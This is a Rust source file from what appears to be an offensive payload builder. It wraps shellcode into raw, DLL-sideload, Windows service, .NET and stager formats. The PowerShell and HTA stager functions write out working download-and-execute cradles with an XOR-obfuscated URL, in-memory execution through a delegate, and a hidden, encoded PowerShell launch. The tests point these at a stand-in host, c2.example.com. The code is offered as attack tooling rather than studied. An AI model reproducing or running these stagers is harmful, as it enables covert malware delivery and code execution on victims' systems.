//! Output format wrappers for payload generation.
//!
//! Each format wraps an obfuscated PIC blob + config into a delivery-ready
//! binary: raw shellcode, DLL sideload, Windows service EXE, .NET assembly,
//! or stager (PowerShell / HTA).

use super::BuilderError;

/// Raw shellcode (.bin): PIC blob + config appended.
///
/// Layout: `[PIC blob][config_len: u32 LE][config_blob]`
pub fn format_raw(blob: &[u8], config: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(blob.len() + 4 + config.len());
    out.extend_from_slice(blob);
    out.extend_from_slice(&(config.len() as u32).to_le_bytes());
    out.extend_from_slice(config);
    out
}

/// DLL sideloading (.dll): minimal DLL with `DllMain` executing the PIC blob.
///
/// Generates a minimal PE DLL stub that:
/// 1. Allocates RWX memory in `DllMain(DLL_PROCESS_ATTACH)`
/// 2. Copies the PIC blob + config
/// 3. Jumps to the PIC entry point
///
/// `proxy_target` optionally names a DLL whose exports are proxied (for
/// sideloading scenarios).
pub fn format_dll(blob: &[u8], config: &[u8], proxy_target: Option<&str>) -> Vec<u8> {
    let payload = format_raw(blob, config);

    let mut pe = build_minimal_dll_stub(&payload, proxy_target);

    // Embed the actual payload at the marker location
    if let Some(pos) = find_marker(&pe, PAYLOAD_MARKER) {
        let end = pos + PAYLOAD_MARKER.len();
        // Replace marker with payload length header + payload data appended after PE
        pe[pos..end].copy_from_slice(&[0u8; PAYLOAD_MARKER.len()]);
        // Write payload length at marker position
        let len_bytes = (payload.len() as u32).to_le_bytes();
        pe[pos..pos + 4].copy_from_slice(&len_bytes);
        // Append payload at end of PE
        pe.extend_from_slice(&payload);
    } else {
        // Fallback: append payload with length prefix
        pe.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        pe.extend_from_slice(&payload);
    }

    pe
}

/// Service EXE (.exe): minimal Windows service binary executing PIC blob.
///
/// The stub implements `ServiceMain` and `HandlerEx`, transitioning through
/// SERVICE_START_PENDING → SERVICE_RUNNING, executing the payload, then
/// signalling SERVICE_STOPPED.
pub fn format_service_exe(blob: &[u8], config: &[u8], service_name: &str) -> Vec<u8> {
    let payload = format_raw(blob, config);
    let mut pe = build_minimal_service_stub(&payload, service_name);

    if let Some(pos) = find_marker(&pe, PAYLOAD_MARKER) {
        let end = pos + PAYLOAD_MARKER.len();
        pe[pos..end].copy_from_slice(&[0u8; PAYLOAD_MARKER.len()]);
        let len_bytes = (payload.len() as u32).to_le_bytes();
        pe[pos..pos + 4].copy_from_slice(&len_bytes);
        pe.extend_from_slice(&payload);
    } else {
        pe.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        pe.extend_from_slice(&payload);
    }

    pe
}

/// .NET assembly wrapper: `Assembly.Load` from embedded byte array.
///
/// Produces a minimal .NET executable that loads the PIC blob + config from
/// an embedded resource and executes it via P/Invoke `VirtualAlloc` → memcpy → call.
pub fn format_dotnet(blob: &[u8], config: &[u8]) -> Vec<u8> {
    let payload = format_raw(blob, config);
    let mut assembly = build_minimal_dotnet_stub(&payload);

    if let Some(pos) = find_marker(&assembly, PAYLOAD_MARKER) {
        let end = pos + PAYLOAD_MARKER.len();
        assembly[pos..end].copy_from_slice(&[0u8; PAYLOAD_MARKER.len()]);
        let len_bytes = (payload.len() as u32).to_le_bytes();
        assembly[pos..pos + 4].copy_from_slice(&len_bytes);
        assembly.extend_from_slice(&payload);
    } else {
        assembly.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        assembly.extend_from_slice(&payload);
    }

    assembly
}

/// PowerShell stager (OPSEC WARNING: high detection risk).
///
/// Generates a PowerShell script that downloads and executes the payload.
/// This format is inherently noisy — suitable only for initial access where
/// stealth is not the primary concern.
pub fn format_ps1_stager(
    download_url: &str,
    _blob: &[u8],
    _config: &[u8],
) -> Result<Vec<u8>, BuilderError> {
    if download_url.is_empty() {
        return Err(BuilderError::Config(
            "download URL required for PS1 stager".into(),
        ));
    }

    // XOR key for basic string obfuscation of the URL in the stager
    let mut rng = rand::thread_rng();
    let xor_key: u8 = loop {
        let k: u8 = rand::Rng::gen(&mut rng);
        if k != 0 {
            break k;
        }
    };

    let encoded_url: Vec<String> = download_url
        .bytes()
        .map(|b| format!("{}", b ^ xor_key))
        .collect();
    let encoded_csv = encoded_url.join(",");

    let script = format!(
        r#"# OPSEC WARNING: PowerShell stagers are high-risk for detection
$k={xor_key}
$e=[byte[]]@({encoded_csv})
$u=[System.Text.Encoding]::ASCII.GetString(($e|%{{[byte]($_-bxor$k)}}))
$w=New-Object System.Net.WebClient
$w.Headers.Add('User-Agent','Mozilla/5.0')
$b=$w.DownloadData($u)
$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($b.Length)
[System.Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length)
$d=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m,[Action])
$d.Invoke()
"#
    );

    Ok(script.into_bytes())
}

/// HTA stager (OPSEC WARNING: high detection risk).
///
/// Generates an HTA file that downloads and executes the payload via
/// ActiveX + PowerShell.
pub fn format_hta_stager(
    download_url: &str,
    _blob: &[u8],
    _config: &[u8],
) -> Result<Vec<u8>, BuilderError> {
    if download_url.is_empty() {
        return Err(BuilderError::Config(
            "download URL required for HTA stager".into(),
        ));
    }

    // Base64-encode the PowerShell download cradle
    let ps_cradle = format!(
        "$w=New-Object System.Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');$b=$w.DownloadData('{download_url}');$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($b.Length);[System.Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length);$d=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m,[Action]);$d.Invoke()"
    );

    let ps_b64 = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        ps_cradle.as_bytes(),
    );

    let hta = format!(
        r#"<!-- OPSEC WARNING: HTA stagers are high-risk for detection -->
<html>
<head>
<script language="VBScript">
Sub Window_OnLoad
    Set sh = CreateObject("WScript.Shell")
    sh.Run "powershell -nop -w hidden -enc {ps_b64}", 0, False
    window.close
End Sub
</script>
</head>
<body></body>
</html>
"#
    );

    Ok(hta.into_bytes())
}

/// List all supported output format names with descriptions.
pub fn list_formats() -> Vec<FormatInfo> {
    vec![
        FormatInfo {
            name: "raw".into(),
            extension: "bin".into(),
            description: "Raw PIC shellcode blob + config".into(),
            opsec_warning: false,
        },
        FormatInfo {
            name: "dll".into(),
            extension: "dll".into(),
            description: "DLL sideloading payload with optional export proxying".into(),
            opsec_warning: false,
        },
        FormatInfo {
            name: "service_exe".into(),
            extension: "exe".into(),
            description: "Windows service EXE with ServiceMain entry".into(),
            opsec_warning: false,
        },
        FormatInfo {
            name: "dotnet".into(),
            extension: "exe".into(),
            description: ".NET assembly wrapper with embedded shellcode".into(),
            opsec_warning: false,
        },
        FormatInfo {
            name: "ps1_stager".into(),
            extension: "ps1".into(),
            description: "PowerShell download cradle stager".into(),
            opsec_warning: true,
        },
        FormatInfo {
            name: "hta_stager".into(),
            extension: "hta".into(),
            description: "HTA file with embedded PowerShell stager".into(),
            opsec_warning: true,
        },
    ]
}

/// Metadata about a supported output format.
#[derive(Debug, Clone)]
pub struct FormatInfo {
    pub name: String,
    pub extension: String,
    pub description: String,
    pub opsec_warning: bool,
}

// ---------------------------------------------------------------------------
// Internal stub builders
// ---------------------------------------------------------------------------

/// Payload marker embedded in stubs, replaced at build time.
const PAYLOAD_MARKER: &[u8; 16] = b"SPECPAYLOADMARK\x00";

/// Build a minimal DLL PE stub with the payload marker.
fn build_minimal_dll_stub(payload: &[u8], proxy_target: Option<&str>) -> Vec<u8> {
    // Minimal PE/COFF DLL structure
    // This is a template — in production the stub would come from pre-compiled
    // templates. Here we build a minimal valid structure for testing.
    let mut stub = Vec::with_capacity(4096 + payload.len());

    // DOS header
    stub.extend_from_slice(b"MZ");
    stub.extend_from_slice(&[0u8; 58]); // padding
    stub.extend_from_slice(&64u32.to_le_bytes()); // e_lfanew -> PE header at 0x40

    // PE signature at offset 0x40
    stub.extend_from_slice(b"PE\x00\x00");
    // COFF header (20 bytes)
    stub.extend_from_slice(&0x8664u16.to_le_bytes()); // Machine: AMD64
    stub.extend_from_slice(&1u16.to_le_bytes()); // NumberOfSections
    stub.extend_from_slice(&[0u8; 12]); // TimeDateStamp, PointerToSymbolTable, NumberOfSymbols
    stub.extend_from_slice(&240u16.to_le_bytes()); // SizeOfOptionalHeader
    stub.extend_from_slice(&0x2022u16.to_le_bytes()); // Characteristics: DLL | EXECUTABLE | LARGE_ADDRESS

    // Optional header (PE32+)
    stub.extend_from_slice(&0x020Bu16.to_le_bytes()); // Magic: PE32+
    stub.extend_from_slice(&[0u8; 238]); // Rest of optional header (simplified)

    // Section header (.text)
    stub.extend_from_slice(b".text\x00\x00\x00");
    let section_size = (payload.len() + PAYLOAD_MARKER.len() + 512) as u32;
    stub.extend_from_slice(&section_size.to_le_bytes()); // VirtualSize
    stub.extend_from_slice(&0x1000u32.to_le_bytes()); // VirtualAddress
    stub.extend_from_slice(&section_size.to_le_bytes()); // SizeOfRawData
    stub.extend_from_slice(&0x200u32.to_le_bytes()); // PointerToRawData
    stub.extend_from_slice(&[0u8; 12]); // Relocations, LineNumbers, etc
    stub.extend_from_slice(&0xE0000060u32.to_le_bytes()); // Characteristics: CODE|EXECUTE|READ|WRITE

    // Pad to section start
    while stub.len() < 0x200 {
        stub.push(0x00);
    }

    // Embed proxy target info if specified
    if let Some(target) = proxy_target {
        let proxy_marker = b"SPECPROXY";
        stub.extend_from_slice(proxy_marker);
        stub.push(target.len() as u8);
        stub.extend_from_slice(target.as_bytes());
    }

    // Payload marker
    stub.extend_from_slice(PAYLOAD_MARKER);

    stub
}

/// Build a minimal service EXE PE stub with the payload marker.
fn build_minimal_service_stub(payload: &[u8], service_name: &str) -> Vec<u8> {
    let mut stub = Vec::with_capacity(4096 + payload.len());

    // DOS header
    stub.extend_from_slice(b"MZ");
    stub.extend_from_slice(&[0u8; 58]);
    stub.extend_from_slice(&64u32.to_le_bytes());

    // PE signature
    stub.extend_from_slice(b"PE\x00\x00");
    // COFF header
    stub.extend_from_slice(&0x8664u16.to_le_bytes()); // AMD64
    stub.extend_from_slice(&1u16.to_le_bytes());
    stub.extend_from_slice(&[0u8; 12]);
    stub.extend_from_slice(&240u16.to_le_bytes());
    stub.extend_from_slice(&0x0022u16.to_le_bytes()); // EXE | LARGE_ADDRESS

    // Optional header
    stub.extend_from_slice(&0x020Bu16.to_le_bytes());
    stub.extend_from_slice(&[0u8; 238]);

    // Section header
    stub.extend_from_slice(b".text\x00\x00\x00");
    let section_size = (payload.len() + 512) as u32;
    stub.extend_from_slice(&section_size.to_le_bytes());
    stub.extend_from_slice(&0x1000u32.to_le_bytes());
    stub.extend_from_slice(&section_size.to_le_bytes());
    stub.extend_from_slice(&0x200u32.to_le_bytes());
    stub.extend_from_slice(&[0u8; 12]);
    stub.extend_from_slice(&0xE0000060u32.to_le_bytes());

    while stub.len() < 0x200 {
        stub.push(0x00);
    }

    // Embed service name
    let svc_marker = b"SPECSVC\x00";
    stub.extend_from_slice(svc_marker);
    let name_bytes = service_name.as_bytes();
    stub.push(name_bytes.len() as u8);
    stub.extend_from_slice(name_bytes);

    // Payload marker
    stub.extend_from_slice(PAYLOAD_MARKER);

    stub
}

/// Build a minimal .NET assembly stub with the payload marker.
fn build_minimal_dotnet_stub(payload: &[u8]) -> Vec<u8> {
    let mut stub = Vec::with_capacity(4096 + payload.len());

    // DOS header
    stub.extend_from_slice(b"MZ");
    stub.extend_from_slice(&[0u8; 58]);
    stub.extend_from_slice(&64u32.to_le_bytes());

    // PE signature
    stub.extend_from_slice(b"PE\x00\x00");
    // COFF header (target x86 for .NET AnyCPU compat)
    stub.extend_from_slice(&0x014Cu16.to_le_bytes()); // i386
    stub.extend_from_slice(&1u16.to_le_bytes());
    stub.extend_from_slice(&[0u8; 12]);
    stub.extend_from_slice(&224u16.to_le_bytes()); // PE32 optional header size
    stub.extend_from_slice(&0x0022u16.to_le_bytes());

    // Optional header (PE32 for .NET)
    stub.extend_from_slice(&0x010Bu16.to_le_bytes()); // Magic: PE32
    stub.extend_from_slice(&[0u8; 222]);

    // Section header
    stub.extend_from_slice(b".text\x00\x00\x00");
    let section_size = (payload.len() + 512) as u32;
    stub.extend_from_slice(&section_size.to_le_bytes());
    stub.extend_from_slice(&0x2000u32.to_le_bytes());
    stub.extend_from_slice(&section_size.to_le_bytes());
    stub.extend_from_slice(&0x200u32.to_le_bytes());
    stub.extend_from_slice(&[0u8; 12]);
    stub.extend_from_slice(&0xE0000060u32.to_le_bytes());

    while stub.len() < 0x200 {
        stub.push(0x00);
    }

    // .NET CLR header marker
    stub.extend_from_slice(b"SPECNET\x00");

    // Payload marker
    stub.extend_from_slice(PAYLOAD_MARKER);

    stub
}

/// Find a byte marker in a blob (first occurrence).
fn find_marker(data: &[u8], marker: &[u8]) -> Option<usize> {
    data.windows(marker.len()).position(|w| w == marker)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_format_raw_layout() {
        let blob = vec![0x90; 64];
        let config = vec![0xAA; 32];
        let result = format_raw(&blob, &config);

        assert_eq!(result.len(), 64 + 4 + 32);
        assert_eq!(&result[..64], &blob[..]);
        let config_len = u32::from_le_bytes([result[64], result[65], result[66], result[67]]);
        assert_eq!(config_len, 32);
        assert_eq!(&result[68..], &config[..]);
    }

    #[test]
    fn test_format_raw_empty_blob() {
        let blob = vec![];
        let config = vec![0xBB; 16];
        let result = format_raw(&blob, &config);
        assert_eq!(result.len(), 4 + 16);
    }

    #[test]
    fn test_format_dll_produces_pe() {
        let blob = vec![0x90; 128];
        let config = vec![0xCC; 64];
        let result = format_dll(&blob, &config, None);

        // Should start with MZ
        assert_eq!(&result[..2], b"MZ");
        // Should contain the payload
        assert!(result.len() > 512);
    }

    #[test]
    fn test_format_dll_with_proxy() {
        let blob = vec![0x90; 64];
        let config = vec![0xDD; 32];
        let result = format_dll(&blob, &config, Some("version.dll"));

        assert_eq!(&result[..2], b"MZ");
        // Should contain the proxy target string
        assert!(result
            .windows(b"version.dll".len())
            .any(|w| w == b"version.dll"));
    }

    #[test]
    fn test_format_service_exe_produces_pe() {
        let blob = vec![0x90; 128];
        let config = vec![0xEE; 64];
        let result = format_service_exe(&blob, &config, "SpecterSvc");

        assert_eq!(&result[..2], b"MZ");
        // Should contain service name
        assert!(result
            .windows(b"SpecterSvc".len())
            .any(|w| w == b"SpecterSvc"));
    }

    #[test]
    fn test_format_dotnet_produces_pe() {
        let blob = vec![0x90; 128];
        let config = vec![0xFF; 64];
        let result = format_dotnet(&blob, &config);

        assert_eq!(&result[..2], b"MZ");
        // Should contain .NET marker
        assert!(result
            .windows(b"SPECNET\x00".len())
            .any(|w| w == b"SPECNET\x00"));
    }

    #[test]
    fn test_format_ps1_stager() {
        let blob = vec![0x90; 64];
        let config = vec![0xAA; 32];
        let result =
            format_ps1_stager("https://c2.example.com/payload.bin", &blob, &config).unwrap();

        let script = String::from_utf8(result).unwrap();
        assert!(script.contains("OPSEC WARNING"));
        assert!(script.contains("WebClient"));
        // URL should be obfuscated (XOR encoded), not in plaintext
        assert!(!script.contains("https://c2.example.com/payload.bin"));
    }

    #[test]
    fn test_format_ps1_stager_empty_url() {
        let result = format_ps1_stager("", &[], &[]);
        assert!(result.is_err());
    }

    #[test]
    fn test_format_hta_stager() {
        let blob = vec![0x90; 64];
        let config = vec![0xBB; 32];
        let result =
            format_hta_stager("https://c2.example.com/payload.bin", &blob, &config).unwrap();

        let hta = String::from_utf8(result).unwrap();
        assert!(hta.contains("OPSEC WARNING"));
        assert!(hta.contains("<html>"));
        assert!(hta.contains("VBScript"));
        assert!(hta.contains("-enc"));
    }

    #[test]
    fn test_format_hta_stager_empty_url() {
        let result = format_hta_stager("", &[], &[]);
        assert!(result.is_err());
    }

    #[test]
    fn test_list_formats_completeness() {
        let formats = list_formats();
        assert_eq!(formats.len(), 6);

        let names: Vec<&str> = formats.iter().map(|f| f.name.as_str()).collect();
        assert!(names.contains(&"raw"));
        assert!(names.contains(&"dll"));
        assert!(names.contains(&"service_exe"));
        assert!(names.contains(&"dotnet"));
        assert!(names.contains(&"ps1_stager"));
        assert!(names.contains(&"hta_stager"));

        // Stagers should have OPSEC warnings
        for f in &formats {
            if f.name.contains("stager") {
                assert!(f.opsec_warning, "{} should have opsec_warning", f.name);
            }
        }
    }

    #[test]
    fn test_format_raw_roundtrip_config_extraction() {
        let blob = vec![0x48; 100];
        let config = vec![0xDE; 50];
        let result = format_raw(&blob, &config);

        // Extract config from the result
        let config_len_offset = blob.len();
        let extracted_len = u32::from_le_bytes([
            result[config_len_offset],
            result[config_len_offset + 1],
            result[config_len_offset + 2],
            result[config_len_offset + 3],
        ]) as usize;
        let extracted_config =
            &result[config_len_offset + 4..config_len_offset + 4 + extracted_len];
        assert_eq!(extracted_config, &config[..]);
    }
}
